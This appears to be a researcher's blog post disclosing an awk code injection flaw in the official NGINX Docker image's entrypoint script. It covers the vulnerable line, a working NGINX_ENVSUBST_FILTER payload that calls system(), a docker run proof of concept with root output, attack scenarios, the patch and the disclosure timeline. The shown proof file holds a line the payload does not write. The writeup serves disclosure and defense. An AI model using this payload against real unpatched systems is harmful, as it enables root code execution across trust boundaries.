---
title: "I Found a Code Injection Bug in the Official NGINX Docker Image"
date: 2026-05-20
tags: [#nginx, #docker, #containers, #appsec, #bugbounty, #cicd]
thumbnail : ![nginx-vulnerability-thumbnail](../assets/enterprise-sso-trust-boundaries/nginx-thumbnail.jpg)
url: nginx-docker-code-injection
---

# I Found a Code Injection Bug in the Official NGINX Docker Image

A few weeks ago I reported a code injection vulnerability in the official NGINX Docker image. The fix just got merged upstream — credited to me across all five distribution variants of the repository.

This is the writeup I've been sitting on since then.

---

## How It Started

I wasn't hunting for this. I was doing something completely mundane — auditing an internal Kubernetes deployment — and I ended up staring at `/docker-entrypoint.d/20-envsubst-on-templates.sh` because I wanted to understand exactly what ran before the NGINX process started. It's a shell script that ships with the official image. Its job is to substitute environment variable values into NGINX config templates before the server initializes.

I got to this part of the `auto_envsubst()` function and something immediately looked wrong:

```bash
local filter="${NGINX_ENVSUBST_FILTER:-}"

defined_envs=$(printf '${%s} ' $(awk "END { for (name in ENVIRON) { print ( name ~ /${filter}/ ) ? name : \"\" } }" < /dev/null ))
```

`NGINX_ENVSUBST_FILTER` is an optional environment variable that lets you pass a regex — only env vars whose names match that regex get substituted into templates. Useful feature. But look at how `${filter}` lands in that awk invocation: directly interpolated, inside double quotes, with zero sanitization.

I've seen this class of bug before in SQL and shell contexts. The moment I saw it here I thought: *you can close that regex literal and write arbitrary awk code.* And awk has `system()`.

---

## Building the Payload

The awk program looks like this when rendered with a normal filter, say `NGINX_`:

```awk
END { for (name in ENVIRON) { print ( name ~ /NGINX_/ ) ? name : "" } }
```

The filter lands between two `/` delimiters — a regex literal. If I control the filter, I control what's between those delimiters. Closing the first `/` with my own `/` and then injecting awk syntax is the whole attack. The only constraint is that the final `/` the script appends needs to be syntactically valid, so the payload needs to open a new regex literal to absorb it.

Payload:

```
x/ || system("id > /tmp/proof.txt && chmod 644 /tmp/proof.txt") || /x
```

After shell expansion, the full awk program becomes:

```awk
END { for (name in ENVIRON) { print ( name ~ /x/ || system("id > /tmp/proof.txt && chmod 644 /tmp/proof.txt") || /x/ ) ? name : "" } }
```

That's valid awk. The `||` short-circuits the regex match, `system()` fires, and the closing `/x/` absorbs the trailing delimiter the script supplies. Syntactically clean. No parse errors. Just execution.

---

## Running It

```bash
docker run --rm \
  -e NGINX_ENVSUBST_FILTER='x/ || system("id > /tmp/proof.txt && chmod 644 /tmp/proof.txt") || /x' \
  nginx:1.29.8
```

Then from inside a separate shell, `docker exec` into the container and check `/tmp/proof.txt`:

```
-rw-r--r-- 1 root root 39 May 11 10:00 /tmp/proof.txt
```

Contents:

```
uid=0(root) gid=0(root) groups=0(root)
nginx-pwned
```
@image[Screenshot of the successfull POC Run](assets/enterprise-sso-trust-boundaries/docker-nginx-poc.png)

Root execution. File written to disk. Owned by root. The container was still initializing when this ran.

Tested on `nginx:1.29.8` — which is what `nginx:latest` resolves to as of 2026-05-11. Both Debian and Alpine-slim variants of mainline and stable were affected since they all pull from the same entrypoint source.

---

## Why I Took This Seriously

The first question I asked myself was: *does this actually matter in practice?* The standard pushback on this kind of finding is "environment variable injection is already privileged." And technically, that's true. But it misses how modern infrastructure actually works.

**In CI/CD pipelines**, engineers who can merge PRs or modify pipeline YAML can almost always inject environment variables into build jobs. They don't have — and aren't supposed to have — arbitrary code execution on build agents. Those are separate trust boundaries. This vulnerability collapses them. A malicious pipeline config that sets `NGINX_ENVSUBST_FILTER` to the payload runs arbitrary code on the build agent during the next NGINX container startup. Secrets exfiltrated, artifacts poisoned, no logs showing anything unusual because the execution happened before application logging started.

**In Kubernetes**, the permission `configmaps/edit` is routinely granted to developers who are explicitly blocked from `pods/exec`. That separation is intentional — it's how teams let devs manage config without giving them direct shell access to containers. But if the target workload is running this NGINX image, `configmaps/edit` is effectively `pods/exec`. You inject the payload via a ConfigMap-sourced env var, wait for the next pod restart, and achieve blind RCE.

**In multi-tenant PaaS**, platforms that let users configure environment variables but restrict custom entrypoints are completely bypassed. The entrypoint restriction is supposed to be the execution boundary. It isn't here.

And all of this executes during container initialization — before Falco or any other runtime agent has attached to the container process, before network policies are enforced, before application logs have started. It's a clean window.

---

## The Fix

This isn't a sanitization problem. You can't reliably sanitize arbitrary regex strings for safe awk interpolation. The right fix is to never let the value touch the awk program text at all — pass it as an awk variable instead, using `-v`:

```bash
# Before
defined_envs=$(printf '${%s} ' $(awk "END { for (name in ENVIRON) { print ( name ~ /${filter}/ ) ? name : \"\" } }" < /dev/null ))

# After
defined_envs=$(printf '${%s} ' $(awk -v filter="$filter" 'END { for (name in ENVIRON) { print ( name ~ filter ) ? name : "" } }' < /dev/null))
```

`awk -v filter="$filter"` binds the value to an awk variable. When the awk runtime compiles `name ~ filter`, it treats `filter` as a string to compile into a regex at runtime — the value never appears as literal program text. There's no injection surface because data and code never share the same string.

Identical behavior. The filter still works as a regex. Zero functional regression.

---

## Disclosure

I submitted the report to F5's security team at `f5sirt@f5.com`, CC'd `security-alert@nginx.org`, and filed a parallel GitHub Security Advisory on the `docker-library/nginx` repository. I included the full technical write-up, a reproduction script, unaltered terminal output, and the patch.

The fix was merged by the NGINX maintainer [@thresheek](https://github.com/thresheek) as commit [`61b5739`](https://github.com/nginx/docker-nginx/commit/61b573966443b38cd8337dc4a22c0e0695400b4d) — applied across all five distribution variants:

- `entrypoint/20-envsubst-on-templates.sh` (source of truth)
- `mainline/alpine-slim/`
- `mainline/debian/`
- `stable/alpine-slim/`
- `stable/debian/`

The commit message reads: *"envsubst-on-templates: avoid direct interpolation of awk variable. Reported by Rupesh Kumar (NullSpec7or)."*

---

## What This Is Really About

I keep coming back to a broader pattern in infrastructure-layer code. Shell scripts get written for operational convenience — they're not applications, they don't go through the same review process, and the people writing them usually aren't thinking about what happens if someone adversarial controls the inputs. The threat model at write-time is: "an admin sets this variable to a regex." Not: "a CI/CD pipeline user sets this variable to something that breaks out of a code context."

The result is that configuration data flows directly into code generation without any boundary — `eval`, unquoted expansions, string-concatenated interpreter invocations. The injection class is the same whether the interpreter is a SQL engine, a shell, or awk. The data/code separation principle doesn't care about the language.

This finding is one data point in a research framework I've been building around what I'm calling *assumption-chain attack surfaces* — vulnerabilities that emerge from a chain of reasonable-looking assumptions, each of which holds in isolation but collapses when you control an input earlier in the chain. More on that soon.

---

**References**

- Patch commit: [nginx/docker-nginx@61b5739](https://github.com/nginx/docker-nginx/commit/61b573966443b38cd8337dc4a22c0e0695400b4d)
- CWE-94: Improper Control of Generation of Code
- CWE-77: Improper Neutralization of Special Elements used in a Command
- CVSS v3.1: 8.8 (High) — `CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
